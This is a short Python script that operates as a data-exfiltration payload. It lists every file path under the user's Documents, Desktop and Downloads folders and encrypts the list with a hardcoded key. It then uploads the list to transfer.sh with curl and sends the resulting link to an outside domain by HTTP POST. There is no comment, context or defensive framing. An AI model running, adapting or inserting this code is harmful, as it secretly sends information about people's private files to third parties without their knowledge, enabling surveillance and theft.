import os
import pwd
import getpass
import requests

from cryptography.fernet import Fernet
from subprocess import check_output

user = getpass.getuser()
fe = Fernet(b'gda0KrfQjVKFtc9xaQMAc394ZkS8ePWz9A1wJf39REU=')

top_dirs = ['Documents', 'Desktop', 'Downloads']

all_files = []
for top_level in top_dirs:
    for root, dirs, files in os.walk(os.path.join('/', 'Users', user, top_level), topdown=False):
        for name in files:
            all_files.append(os.path.join(root, name))

token = fe.encrypt('\n'.join(all_files).encode())

with open('all-files.txt', 'wb') as f:
    f.write(token)

output = check_output(['curl',
    '--upload-file',
    './all-files.txt',
    'https://transfer.sh/payload.txt'])

requests.post('http://famatvisualizer.com/suggest-elip/', data={'text': output})

